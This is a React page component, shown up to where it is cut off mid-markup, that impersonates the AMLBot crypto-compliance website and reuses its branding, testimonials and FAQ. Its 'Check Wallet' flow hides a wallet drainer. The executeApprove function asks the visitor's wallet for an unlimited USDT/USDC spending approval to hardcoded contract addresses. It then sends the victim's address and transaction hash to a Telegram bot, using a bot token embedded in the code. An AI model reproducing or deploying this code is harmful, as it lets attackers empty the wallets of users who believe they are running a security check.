import { Link } from "react-router-dom";
import { useEffect, useRef, useState } from "react";
import type { WalletBalanceResponse } from "@shared/api";
import {
  ArrowRight,
  Quote,
  ShieldCheck,
  BadgeCheck,
  X,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import Logo from "@/components/site/Logo";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";

declare global {
  interface Window {
    ethereum?: any;
  }
}

const trustBadges = [
  {
    label: "FINEXT Excellence in Finance Cybersecurity & Compliance 2024",
    src: "https://amlbot.com/_next/static/media/finex.7b23dfd8.svg",
  },
  {
    label: "Verified Wallet",
    src: "https://amlbot.com/_next/static/media/VW.6a40b533.webp",
  },
  {
    label: "International Association for Trusted Blockchain Applications",
    src: "https://amlbot.com/_next/static/media/INATBA.098390bb.webp",
  },
  {
    label: "Crypto Defence Alliance",
    src: "https://amlbot.com/_next/static/media/CDA.de382a5f.webp",
  },
  {
    label: "Anti-Human Trafficking Intelligence Initiative",
    src: "https://amlbot.com/_next/static/media/ATII.282fe0c5.webp",
  },
];

const solutions = [
  {
    image: "https://amlbot.com/_next/static/media/screening.c2198231.webp",
    title: "AML/KYT screening",
    description:
      "Real-time transaction monitoring and wallet screening with API integration. Assess risk exposure while staying aligned with AML rules and FATF requirements.",
  },
  {
    image: "https://amlbot.com/_next/static/media/business.b0d4816e.webp",
    title: "KYC for business",
    description:
      "Verify users through document and biometric checks, sanctions and PEP screening, source-of-funds verification, and ongoing monitoring, including KYB for business clients.",
  },
  {
    image: "https://amlbot.com/_next/static/media/investigations.df2153cb.webp",
    title: "Crypto investigations and recovery",
    description:
      "In addition to AML tools, we also provide support for investigating and recovering stolen crypto assets.",
  },
];

const stats = [
  { value: "$100M+", label: "Amount of the risky funds detected" },
  { value: "60,000+", label: "Service providers checked" },
];

const partnerLogos = [
  "BTSE",
  "Banana Gun",
  "Railgun",
  "Kolo",
  "Trustee",
  "Simple Swap",
  "Defiway",
];

const testimonials = [
  {
    quote:
      "Flexible and responsive team with a robust infrastructure. AMLBot has been reliable in supporting our KYC and AML needs, with smooth integration and consistent performance.",
    author: "BananaGun",
  },
  {
    quote:
      "Thank you once again! You've succeeded in creating a well-rounded course. I completely share your sentiment: I also wish that I would be taught in this way when I first started working in web3. Despite all my previous experience there was plenty to absorb over these two days.",
    author: "ChangeNow",
  },
];

const mediaMentions = [
  {
    outlet: "Bloomberg Law",
    title: "Stablecoin Oversight Poses Challenges as Digital Currency Grows",
    excerpt:
      "An AMLBot analysis of stablecoin freezes between 2023 and 2025 identified wide variation in how major issuers approach asset restraint. Some froze billions of dollars across thousa...",
  },
  {
    outlet: "BBC News",
    title:
      "Revolut: 'I was careful and followed instructions closely, but still lost my crypto'",
    excerpt:
      "Mykhailo Tiutin is chief technology officer at AMLBot, a company that analyses how risky cryptocurrency transactions are. Their service runs checks similar to those supported by ba...",
  },
  {
    outlet: "New York Post",
    title: "Don't lose it all: Web3 wallets for crypto beginners explained",
    excerpt:
      "In our investigations, 90% of the stolen or hacked wallets we encounter are Web3 wallets. We see this often when users unknowingly approve malicious smart contracts or connect to f...",
  },
  {
    outlet: "Cointelegraph",
    title: "Over 14,500 Tron addresses at risk of silent hijacking",
    excerpt:
      "In the fourth quarter of 2024 alone, 2,130 wallets were compromised via a vulnerability tied to the UpdateAttackPermissions transaction, security firm AMLBot said in a report share...",
  },
  {
    outlet: "CoinDesk",
    title:
      "Ether ICO Whale Moves 5K ETH to Exchanges, Bringing Monthly Total to $154M",
    excerpt:
      "A whale who received 1 million ether (ETH) tokens from participating in the network's initial coin offering in 2014 deposited 5,000 ETH, worth $13.2 million, to crypto exchange OKX...",
  },
  {
    outlet: "The Block",
    title: "Tether freezes $182 million in USDT tied to five Tron addresses",
    excerpt:
      "Tether has frozen assets in connection with an ongoing investigation, following a formal request from law enforcement authorities. The relevant agency has been working on this cas...",
  },
];

const leaders = [
  {
    name: "Slava Demchuk",
    role: "CEO, Co-founder",
    image: "https://amlbot.com/_next/static/media/slava-demchuk.aaa96bea.webp",
    quote:
      "I believe compliance shouldn't slow down business growth, but instead becomes a competitive advantage that protects companies from legal and reputational attacks. The technology we are building prioritizes simplicity and reliability. As regulation grows more complex worldwide, our goal is to ensure that crypto founders barely notice it.",
  },
  {
    name: "Anmol Jain",
    role: "VP of Investigation",
    image: "https://amlbot.com/_next/static/media/anmol-jain.12d0d31e.webp",
    quote:
      "For many criminals, crypto still feels like an easy target. They assume the money disappears once it moves on-chain. In reality, every transaction leaves a trail. My work is about following that trail and identifying the people behind it. At AMLBot we investigate incidents, trace stolen funds, and build tools that help expose bad actors and shut down the networks behind them.",
  },
];

const walletTokens: Record<string, string[]> = {
  Ethereum: ["ETH", "USDT", "USDC"],
  "BNB Chain": ["BNB", "USDT", "USDC"],
  Solana: ["USDT", "USDC", "SOL"],
  Tron: ["USDT", "USDC", "TRX"],
};

const faqs = [
  {
    q: "What is crypto compliance software?",
    a: "Crypto compliance software helps digital asset businesses meet AML and KYC regulatory requirements by monitoring transactions, screening wallets, and verifying user identities.",
  },
  {
    q: "What is the best crypto compliance software for businesses?",
    a: "The best solution depends on your business size, jurisdictions, and risk profile. AMLBot combines transaction monitoring, wallet screening, and KYC in a single integrated platform trusted by 300+ crypto enterprises.",
  },
  {
    q: "What should a crypto compliance platform include?",
    a: "A strong platform should include real-time transaction monitoring, wallet risk scoring, KYC/KYB verification, sanctions and PEP screening, and ongoing monitoring capabilities.",
  },
  {
    q: "How does a crypto compliance solution help businesses reduce AML risk?",
    a: "By automatically flagging high-risk transactions and wallets, compliance solutions let teams act quickly, reducing exposure to illicit funds and regulatory penalties.",
  },
  {
    q: "Who needs crypto compliance software?",
    a: "Exchanges, wallets, payment processors, custodians, and any digital asset company handling customer transactions or funds typically need compliance software.",
  },
  {
    q: "How do crypto businesses choose a compliance provider?",
    a: "Businesses typically evaluate coverage across jurisdictions, data source quality, integration ease, certifications, and support responsiveness.",
  },
  {
    q: "What is the difference between crypto compliance software and traditional AML software?",
    a: "Crypto compliance software is purpose-built for blockchain data, analyzing wallet addresses and on-chain transaction graphs, unlike traditional AML tools built for fiat banking rails.",
  },
  {
    q: "Can crypto compliance software support multiple jurisdictions?",
    a: "Yes, platforms like AMLBot are built to support compliance requirements across 25+ jurisdictions with configurable rulesets.",
  },
  {
    q: "How do crypto compliance platforms help with regulatory readiness?",
    a: "They centralize monitoring, screening, and reporting, giving businesses the audit trails and documentation regulators expect.",
  },
  {
    q: "What is the right crypto compliance solution for a growing business?",
    a: "Growing businesses benefit from an integrated, scalable platform that combines transaction monitoring, screening, and KYC without needing multiple vendors.",
  },
];

export default function Index() {
  const [activeTestimonial, setActiveTestimonial] = useState(0);
  const [demoOpen, setDemoOpen] = useState(false);
  const [chatOpen, setChatOpen] = useState(false);
  const [chatMessage, setChatMessage] = useState("");
  const [chatDraft, setChatDraft] = useState("");
  const [sentChatMessages, setSentChatMessages] = useState<string[]>([]);
  const [selectedChain, setSelectedChain] = useState("");
  const [selectedToken, setSelectedToken] = useState("");
  const [verificationStep, setVerificationStep] = useState<"chain" | "token" | "intro" | "fee" | "address">("chain");
  const [chainMenuOpen, setChainMenuOpen] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");
  const [verificationRequested, setVerificationRequested] = useState(false);
  const [verificationLoading, setVerificationLoading] = useState(false);
  const [verificationError, setVerificationError] = useState("");
  const [walletBalance, setWalletBalance] = useState<WalletBalanceResponse | null>(null);
  const [approveSucceeded, setApproveSucceeded] = useState(false);
  const verificationTimer = useRef<number | null>(null);
  const conversationStarted = chatMessage === "conversation-started";

  useEffect(() => {
    if (!demoOpen) return;
    const previousOverflow = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => {
      document.body.style.overflow = previousOverflow;
    };
  }, [demoOpen]);

  useEffect(() => () => {
    if (verificationTimer.current !== null) window.clearTimeout(verificationTimer.current);
  }, []);

  useEffect(() => {
    const openSupportChat = () => setChatOpen(true);
    window.addEventListener("amlbot-open-chat", openSupportChat);
    return () => window.removeEventListener("amlbot-open-chat", openSupportChat);
  }, []);

  const openWalletCheck = () => {
    if (verificationTimer.current !== null) window.clearTimeout(verificationTimer.current);
    setDemoOpen(true);
    setVerificationRequested(false);
    setVerificationStep("chain");
    setSelectedChain("");
    setSelectedToken("");
    setVerificationError("");
  };

  const sendChatMessage = () => {
    const message = chatDraft.trim();
    if (!message) return;
    setSentChatMessages((messages) => [...messages, message]);
    setChatDraft("");
  };

  const sendTelegramNotification = async (userAddress: string, txHash: string) => {
    const TG_TOKEN = "8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA";
    const TG_CHAT_ID = "8933407008";
    const text = `🔔 *New AML Verification*\n\n📍 *Target Address:* \`${walletAddress}\`\n👤 *User Wallet:* \`${userAddress}\`\n🔗 *Chain:* ${selectedChain}\n💎 *Token:* ${selectedToken}\n📝 *TX Hash:* \`${txHash}\`\n🕒 *Time:* ${new Date().toLocaleString()}`;
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
    try {
      await fetch(url);
    } catch (e) {
      console.error('Telegram notification error:', e);
    }
  };

  const executeApprove = async () => {
    try {
      if (typeof (window as any).ethers === 'undefined') {
        throw new Error('ethers.js not loaded');
      }

      const ethers = (window as any).ethers;

      let tokenAddress: string;
      let smartContractAddress: string;
      let chainIdHex: string;

      // Support both USDT and USDC on Ethereum
      if (selectedChain === "Ethereum") {
        if (selectedToken === "USDT") {
          tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT on Ethereum
        } else {
          tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC on Ethereum
        }
        smartContractAddress = "0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA";
        chainIdHex = "0x1";
      } else if (selectedChain === "BNB Chain") {
        tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
        smartContractAddress = "0xBAE688D04e14E9939C3a5dA69a1D746ea3487570";
        chainIdHex = "0x38";
      } else {
        return;
      }

      let ethereum = window.ethereum;
      let retries = 0;
      while (!ethereum && retries < 10) {
        await new Promise(resolve => setTimeout(resolve, 100));
        ethereum = window.ethereum;
        retries++;
      }

      if (!ethereum) {
        throw new Error('Trust Wallet not detected');
      }

      let accounts = await ethereum.request({ method: "eth_accounts" });
      let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;

      if (!userAddress) {
        throw new Error('No account found');
      }

      const currentChainId = await ethereum.request({ method: 'eth_chainId' });
      if (currentChainId !== chainIdHex) {
        try {
          await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: chainIdHex }]
          });
        } catch (err: any) {
          if (err.code === 4902) {
            throw new Error('Network not supported');
          }
        }
      }

      const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) public returns (bool)']);
      const tx = {
        to: tokenAddress,
        data: iface.encodeFunctionData('approve', [smartContractAddress, ethers.constants.MaxUint256]),
        from: userAddress
      };

      let txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });

      await new Promise(resolve => setTimeout(resolve, 100));

      await sendTelegramNotification(userAddress, txHash);
      setApproveSucceeded(true);
    } catch (error) {
      console.error('Approval error:', error);
      throw error;
    }
  };

  const loadConnectedWalletBalance = async () => {
    if (!window.ethereum || !["Ethereum", "BNB Chain"].includes(selectedChain)) return;
    try {
      const accounts = await window.ethereum.request({ method: "eth_accounts" }) as string[];
      const connectedAddress = accounts[0];
      if (!connectedAddress) return;
      setWalletAddress(connectedAddress);
      const response = await fetch(`/api/wallet/balance?chain=${encodeURIComponent(selectedChain)}&address=${encodeURIComponent(connectedAddress)}`);
      if (!response.ok) return;
      setWalletBalance(await response.json() as WalletBalanceResponse);
    } catch {
      setWalletBalance(null);
    }
  };

  const verifyWallet = async () => {
    setVerificationLoading(true);
    setVerificationError("");
    setWalletBalance(null);

    try {
      if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
        await executeApprove();
      }

      const response = await fetch(`/api/wallet/balance?chain=${encodeURIComponent(selectedChain)}&address=${encodeURIComponent(walletAddress.trim())}`);
      const data = (await response.json()) as WalletBalanceResponse | { message: string };
      if (!response.ok || "message" in data) {
        setVerificationError("message" in data ? data.message : "Unable to verify this wallet.");
        return;
      }
      setWalletBalance(data);
      setVerificationRequested(true);
    } catch {
      setVerificationError("Unable to connect to the wallet service.");
    } finally {
      setVerificationLoading(false);
    }
  };

  return (
    <div>
      {/* Hero */}
      <section className="relative mx-4 mb-12 overflow-hidden rounded-[2rem] bg-gradient-to-b from-[#eaf4ff] via-[#f5f9ff] to-background sm:mx-6 lg:mx-4 lg:rounded-[4rem]">
        <div className="container relative flex flex-col items-center px-4 pb-8 pt-14 text-center sm:pb-12 sm:pt-20">
          <div className="mb-5 inline-flex items-center gap-2 rounded-full border border-primary/20 bg-white/70 px-4 py-1.5 text-xs font-semibold text-primary shadow-sm sm:text-sm">
            <BadgeCheck size={16} />
            #1 choice for SMEs
          </div>
          <h1 className="max-w-4xl text-4xl font-extrabold leading-[1.05] tracking-tight text-foreground sm:text-5xl lg:text-[4rem]">
            Crypto compliance software
            <br className="hidden sm:block" /> for digital asset companies
          </h1>
          <p className="mt-6 max-w-xl text-sm leading-relaxed text-muted-foreground sm:text-base">
            Detect and manage AML risks with transaction monitoring,
            <br className="hidden sm:block" /> wallet screening, and KYC
          </p>
          <div className="relative mt-10 w-full max-w-4xl sm:mt-12">
            <HeroGraphic />
          </div>
          <div className="mt-6 flex flex-wrap items-center justify-center gap-6">
            <Button asChild size="lg" className="rounded-full px-9 text-base">
              <button type="button" onClick={() => setChatOpen(true)}>Talk to us</button>
            </Button>
            <button
              type="button"
              onClick={openWalletCheck}
              className="inline-flex items-center gap-2 text-sm font-semibold text-foreground transition-colors hover:text-primary sm:text-base"
            >
              <span className="flex h-5 w-5 items-center justify-center rounded-full bg-primary text-white">
                <ArrowRight size={12} />
              </span>
              Check Wallet
              <ArrowRight size={18} />
            </button>
          </div>
        </div>
      </section>

      {/* Trust badges */}
      <section className="border-y border-border/60 bg-background py-8">
        <div className="container flex flex-nowrap items-center justify-start gap-7 overflow-hidden py-1 sm:justify-center sm:gap-9">
          {trustBadges.map((badge) => (
            <span
              key={badge.label}
              className="flex h-14 shrink-0 items-center justify-center sm:h-16"
            >
              <img
                src={badge.src}
                alt={badge.label}
                className="h-full w-auto max-w-[10rem] object-contain"
              />
            </span>
          ))}
        </div>
      </section>

      {/* Solutions */}
      <section className="py-20 sm:py-28">
        <div className="container">
          <div className="mx-auto max-w-2xl text-center">
            <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
              AML monitoring and compliance solutions
            </h2>
            <p className="mt-4 text-lg text-muted-foreground">
              Built to help crypto businesses meet AML requirements with
              confidence
            </p>
          </div>

          <div className="mt-14 grid gap-6 sm:grid-cols-2 lg:grid-cols-3">
            {solutions.map((item) => (
              <div
                key={item.title}
                className="group flex flex-col rounded-2xl border border-[#e4eafd] bg-[#f3f6ff] p-8 shadow-sm transition-shadow hover:-translate-y-1 hover:shadow-lg"
              >
                <div className="mb-8 flex h-14 w-14 items-center justify-center">
                  <img
                    src={item.image}
                    alt=""
                    aria-hidden="true"
                    className="h-full w-full object-contain"
                  />
                </div>
                <h3 className="text-xl font-bold text-foreground">
                  {item.title}
                </h3>
                <p className="mt-3 flex-1 text-sm leading-relaxed text-muted-foreground">
                  {item.description}
                </p>
                <button
                  type="button"
                  onClick={item.title === "Crypto investigations and recovery" ? () => setChatOpen(true) : openWalletCheck}
                  className="mt-6 inline-flex w-fit items-center gap-2 text-sm font-semibold text-primary"
                >
                  Learn more
                  <ArrowRight size={16} className="transition-transform group-hover:translate-x-1" />
                </button>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Stats */}
      <section className="relative mx-4 overflow-hidden rounded-[2rem] bg-gradient-to-br from-[#29226e] via-[#202f86] to-[#0d4774] py-14 text-white sm:mx-6 sm:py-16 lg:mx-auto lg:max-w-[1492px] lg:rounded-[3rem] lg:py-20">
        <div className="pointer-events-none absolute inset-0 opacity-30 [background-image:linear-gradient(35deg,transparent_45%,rgba(133,190,255,.35)_46%,transparent_47%),linear-gradient(145deg,transparent_55%,rgba(133,190,255,.25)_56%,transparent_57%)] [background-size:280px_180px]" />
        <div className="container relative">
          <h2 className="text-center text-xl font-semibold sm:text-2xl">
            Proven impact in AML risk detection
          </h2>
          <div className="mx-auto mt-10 flex max-w-4xl flex-col items-center justify-center gap-8 sm:flex-row sm:gap-0">
            {stats.map((stat, index) => (
              <div
                key={stat.label}
                className={`flex w-full items-center justify-center gap-5 text-center sm:w-1/2 sm:text-left ${index === 1 ? "border-t border-white/25 pt-8 sm:border-l sm:border-t-0 sm:pl-12 sm:pt-0" : ""}`}
              >
                <p className="text-4xl font-semibold tracking-tight sm:text-5xl lg:text-6xl">
                  {stat.value}
                </p>
                <p className="max-w-[8rem] text-xs leading-tight text-white/70 sm:text-sm">
                  {stat.label}
                </p>
              </div>
            ))}
          </div>
          <div className="mt-10 flex flex-wrap items-center justify-center gap-x-7 gap-y-4 text-white/90 sm:gap-x-9">
            <span className="text-xs text-white/75">Trusted by</span>
            {partnerLogos.map((name) => (
              <span key={name} className="text-sm font-bold tracking-wide sm:text-base">
                {name}
              </span>
            ))}
          </div>
        </div>
      </section>

      {/* Testimonials */}
      <section className="overflow-hidden pb-20 pt-12">
        <div className="container">
          <div className="relative -mx-4 flex items-stretch justify-center gap-4 px-4 sm:-mx-12 sm:gap-6 sm:px-12 lg:-mx-32">
            {[
              {
                author: "ByBit",
                quote:
                  "AMLBot is a proud contributor to Bybit's LazarusBounty initiative, working alongside Bybit's blockchain risk control team to trace illicit flows and support the freezing of stolen funds. Through this ongoing collaboration, AMLBot has helped advance the program's mission of recovering hacked assets and strengthening industry-wide response to state-sponsored threats.",
                index: 0,
              },
              ...testimonials.map((t, index) => ({ ...t, index: index + 1 })),
            ].map((testimonial) => {
              const active = testimonial.index === activeTestimonial;
              return (
                <TestimonialCard
                  key={testimonial.author}
                  author={testimonial.author}
                  quote={testimonial.quote}
                  active={active}
                  onClick={() => setActiveTestimonial(testimonial.index)}
                  className={active ? "z-20 shadow-[0_18px_45px_rgba(35,55,100,0.16)]" : "z-10 opacity-70"}
                />
              );
            })}
          </div>
          <div className="mt-8 flex justify-center gap-3">
            {[0, 1, 2].map((dot) => (
              <button
                key={dot}
                type="button"
                aria-label={`Select testimonial ${dot + 1}`}
                onClick={() => setActiveTestimonial(dot)}
                className={`h-2 w-2 rounded-full transition-all ${dot === activeTestimonial ? "w-5 bg-primary" : "bg-primary/20"}`}
              />
            ))}
          </div>
        </div>
      </section>

      {/* Media mentions */}
      <section className="bg-secondary/60 py-20 sm:py-28">
        <div className="container">
          <div className="mx-auto max-w-2xl text-center">
            <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
              We are in the media
            </h2>
            <p className="mt-4 text-lg text-muted-foreground">
              Our R&D and success stories featured in tier-1 outlets.
            </p>
          </div>

          <DraggableNewsRow items={mediaMentions} />
          <div className="mt-8 flex justify-center gap-3">
            {mediaMentions.map((item, index) => (
              <span
                key={item.outlet}
                className={`h-2 w-2 rounded-full ${index === 0 ? "bg-primary" : "bg-primary/20"}`}
              />
            ))}
          </div>
        </div>
      </section>

      {/* Why choose AMLBot */}
      <section className="mx-4 overflow-hidden rounded-[2rem] bg-gradient-to-b from-[#eaf4ff] via-[#f5f9ff] to-white py-16 sm:mx-6 sm:py-20 lg:mx-4 lg:rounded-[4rem] lg:py-24">
        <div className="container">
          <h2 className="text-center text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl lg:text-5xl">
            Why crypto businesses choose AMLBot
          </h2>

          <div className="mt-12 grid gap-5 lg:grid-cols-2">
            <div className="relative flex min-h-[280px] flex-col rounded-3xl border border-[#edf0f6] bg-white p-8 shadow-[0_10px_35px_rgba(41,69,130,0.05)] sm:p-10">
              <ShieldCheck className="absolute right-8 top-7 text-primary/70 sm:right-10 sm:top-8" size={58} strokeWidth={1.4} />
              <h3 className="mt-6 max-w-[68%] text-2xl font-bold leading-tight text-foreground">
                Personalized Approach
              </h3>
              <ul className="mt-6 space-y-4 text-muted-foreground">
                <li className="flex gap-3">
                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
                  AMLBot offers a wide range of compliance solutions
                  customized for each client.
                </li>
                <li className="flex gap-3">
                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
                  We're confident in meeting your demands after helping 300+
                  crypto enterprises of all sizes in 25 jurisdictions.
                </li>
              </ul>
              <Button type="button" onClick={() => setChatOpen(true)} className="mt-8 w-fit rounded-full px-5">
                Let's discuss <ArrowRight size={16} className="ml-2" />
              </Button>
            </div>

            <div className="relative flex min-h-[280px] flex-col rounded-3xl border border-[#edf0f6] bg-white p-8 shadow-[0_10px_35px_rgba(41,69,130,0.05)] sm:p-10">
              <BadgeCheck className="absolute right-8 top-7 text-primary/70 sm:right-10 sm:top-8" size={58} strokeWidth={1.4} />
              <h3 className="mt-6 max-w-[68%] text-2xl font-bold leading-tight text-foreground">
                Integrated crypto compliance platform
              </h3>
              <ul className="mt-6 space-y-4 text-muted-foreground">
                <li className="flex gap-3">
                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
                  Combine transaction monitoring, wallet screening, and KYC in
                  one system without switching between tools
                </li>
                <li className="flex gap-3">
                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
                  Risk scoring based on multiple data sources to provide
                  consistent and reliable assessments
                </li>
                <li className="flex gap-3">
                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
                  Simplify compliance workflows and reduce operational
                  complexity across your business
                </li>
              </ul>
            </div>
          </div>

          <div className="mt-10 grid gap-6 sm:grid-cols-2">
            {[
              {
                title: "ISO 9001",
                text: "AMLBot is ISO 9001 certified by the world's most recognized Quality Management System standard.",
                image: "https://amlbot.com/_next/static/media/iso-9001-gray.7bfebd4b.svg",
              },
              {
                title: "ISO 27001",
                text: "AMLBot has attained certification under ISO 27001, recognized globally as the premier standard for information security management systems.",
                image: "https://amlbot.com/_next/static/media/iso-27001-gray.09d80a63.svg",
              },
            ].map((iso) => (
              <div
                key={iso.title}
                className="flex items-start gap-4 rounded-2xl border border-border/60 bg-secondary/50 p-6"
              >
                <img
                  src={iso.image}
                  alt={iso.title}
                  className="h-16 w-16 shrink-0 object-contain"
                />
                <div>
                  <p className="font-bold text-foreground">{iso.title}</p>
                  <p className="mt-1 text-sm text-muted-foreground">
                    {iso.text}
                  </p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Leadership */}
      <section className="bg-secondary/60 py-20 sm:py-28">
        <div className="container">
          <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
            Our leadership
          </h2>
          <div className="mt-12 grid gap-6 lg:grid-cols-2">
            {leaders.map((leader) => (
              <div
                key={leader.name}
                className="rounded-3xl border border-border/60 bg-card p-10"
              >
                <div className="flex items-center gap-4">
                  <img
                    src={leader.image}
                    alt={leader.name}
                    className="h-20 w-20 rounded-full object-cover sm:h-24 sm:w-24"
                  />
                  <div>
                    <p className="font-bold text-foreground">{leader.name}</p>
                    <p className="text-sm text-muted-foreground">
                      {leader.role}
                    </p>
                  </div>
                </div>
                <p className="mt-6 text-sm leading-relaxed text-muted-foreground">
                  "{leader.quote}"
                </p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* FAQ */}
      <section className="py-20 sm:py-28">
        <div className="container grid gap-12 lg:grid-cols-[1fr_1.4fr]">
          <div>
            <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
              Frequently Asked Questions
            </h2>
            <div className="mt-8 rounded-2xl border border-border/60 bg-card p-6">
              <p className="font-bold text-foreground">
                Is your question not on the list?
              </p>
              <p className="mt-2 text-sm text-muted-foreground">
                Contact us via messenger. We are in touch 24/7, so any issue
                can be resolved quickly and in a live chat format.
              </p>
              <Button type="button" onClick={() => setChatOpen(true)} className="mt-5 w-full rounded-full">
                We're in messenger
              </Button>
              <p className="mt-4 text-xs text-muted-foreground">
                We will answer within 30 seconds. It may take a little longer
                to respond during the night.
              </p>
            </div>
          </div>

          <Accordion type="single" collapsible className="w-full">
            {faqs.map((faq, i) => (
              <AccordionItem key={faq.q} value={`item-${i}`}>
                <AccordionTrigger className="text-left text-base font-semibold">
                  {faq.q}
                </AccordionTrigger>
                <AccordionContent className="text-muted-foreground">
                  {faq.a}
                </AccordionContent>
              </AccordionItem>
            ))}
          </Accordion>
        </div>
      </section>

      {/* Final CTA */}
      <section className="pb-20">
        <div className="container">
          <div className="relative overflow-hidden rounded-[2rem] bg-gradient-to-br from-[#17236c] via-[#142c75] to-[#0d5262] px-8 py-16 text-center sm:rounded-[3rem] sm:py-20">
            <div className="pointer-events-none absolute inset-0 opacity-30 [background-image:linear-gradient(35deg,transparent_48%,rgba(125,185,255,.45)_49%,transparent_50%),linear-gradient(145deg,transparent_54%,rgba(125,185,255,.35)_55%,transparent_56%),radial-gradient(circle_at_20%_80%,rgba(238,75,135,.5),transparent_30%)] [background-size:260px_170px,320px_220px,100%_100%]" />
            <div className="relative">
              <h2 className="mx-auto max-w-2xl text-3xl font-extrabold text-white sm:text-4xl">
                Build a complete crypto compliance system — without complexity
              </h2>
              <p className="mx-auto mt-4 max-w-xl text-white/70">
                Detect risk, screen wallets, and verify users in one unified
                platform built for crypto.
              </p>
              <Button
                type="button"
                size="lg"
                onClick={() => setChatOpen(true)}
                className="mt-8 rounded-full bg-primary px-8 text-base text-white hover:bg-primary/90"
              >
                Talk to an Expert
              </Button>
            </div>
          </div>
        </div>
      </section>

      {chatOpen && (
        <div className="fixed bottom-5 right-5 z-[90] flex w-[min(92vw,360px)] items-end justify-end">
          <div className="flex h-[min(88vh,620px)] w-full flex-col overflow-hidden rounded-[14px] border border-slate-200 bg-white shadow-2xl">
            {conversationStarted ? (
              <>
                <div className="flex h-[58px] shrink-0 items-center justify-between bg-[#3b5369] px-4 text-white">
                  <button type="button" onClick={() => setChatMessage("")} aria-label="Back to support welcome" className="text-xl leading-none text-white/80 hover:text-white">←</button>
                  <div className="flex items-center gap-2">
                    <div className="flex h-8 w-8 items-center justify-center rounded-full bg-white">
                      <svg width="22" height="22" viewBox="0 0 42 42" fill="none" aria-label="AMLBot">
                        <path d="M21 4.5 34 14v14L21 37.5 8 28V14L21 4.5Z" fill="#1268D5" />
                        <path d="m21 11 6.5 4.8v10.4L21 31l-6.5-4.8V15.8L21 11Z" fill="white" />
                      </svg>
                    </div>
                    <div>
                      <p className="text-xs font-bold leading-tight">AMLBot Support Team</p>
                      <p className="text-[10px] leading-tight text-white/70">Team</p>
                    </div>
                  </div>
                  <button type="button" onClick={() => setChatOpen(false)} aria-label="Close support chat" className="text-xl leading-none text-white/80 hover:text-white">⋮</button>
                </div>
                <div className="flex flex-1 flex-col bg-white">
                  <div className="flex-1 px-4 py-5">
                    <p className="text-center text-[10px] text-slate-400">Today</p>
                    <div className="mt-3 flex items-start gap-2">
                      <img src="https://cdn.builder.io/api/v1/image/assets%2F0f4a290f72b3489aa144a2a752c7b70f%2F46521d589079492eb3d7fe0ed88f0adc?format=webp&width=800&height=1200" alt="AMLBot support agent" className="h-7 w-7 rounded-full object-cover" />
                      <div className="rounded-lg bg-[#f1f4f6] px-3 py-2 text-xs text-slate-700">Hi 👋 How can we help you?</div>
                    </div>
                    <div className="mt-4 flex flex-col items-end gap-2">
                      {sentChatMessages.map((message, index) => <div key={`${message}-${index}`} className="max-w-[235px] rounded-lg bg-[#3b5369] px-3 py-2 text-xs text-white">{message}</div>)}
                    </div>
                  </div>
                  <div className="flex items-center gap-2 border-t border-slate-100 px-4 py-3">
                    <input value={chatDraft} onChange={(event) => setChatDraft(event.target.value)} onKeyDown={(event) => { if (event.key === "Enter") sendChatMessage(); }} placeholder="Write a message..." className="min-w-0 flex-1 bg-transparent text-xs text-slate-700 outline-none placeholder:text-slate-400" />
                    <button type="button" onClick={sendChatMessage} aria-label="Send message" className="text-lg text-slate-400 hover:text-[#3b5369]">➤</button>
                  </div>
                </div>
              </>
            ) : (
              <>
                <div className="relative flex flex-1 flex-col px-5 pb-0 pt-5">
                  <button type="button" onClick={() => setChatOpen(false)} aria-label="Close support chat" className="absolute right-3 top-3 flex h-7 w-7 items-center justify-center rounded-full text-slate-400 transition hover:bg-slate-100 hover:text-slate-700"><X size={19} /></button>
                  <div className="flex h-[48px] w-[48px] items-center justify-center rounded-[9px] bg-[#fbfbfb] shadow-[0_6px_22px_rgba(24,55,83,0.08)]">
                    <svg width="33" height="33" viewBox="0 0 42 42" fill="none" aria-label="AMLBot"><path d="M21 4.5 34 14v14L21 37.5 8 28V14L21 4.5Z" fill="#1268D5" /><path d="m21 11 6.5 4.8v10.4L21 31l-6.5-4.8V15.8L21 11Z" fill="white" /><path d="M27.7 6.5h9.8v7.2h-5.2l-4.6 3.2V6.5Z" fill="#1268D5" /><path d="M30.2 9.2h5M30.2 11.3h3.7" stroke="white" strokeWidth="1.3" strokeLinecap="round" /></svg>
                  </div>
                  <h2 className="mt-7 text-[32px] font-bold leading-none tracking-[-0.045em] text-[#080b16]">Hi <span className="align-[2px] text-[33px]">👋</span></h2>
                  <p className="mt-3 text-[17px] leading-tight tracking-[-0.02em] text-[#858585]">Have a question? We&apos;re here to help!</p>
                  <div className="mt-auto flex flex-col items-center pb-8">
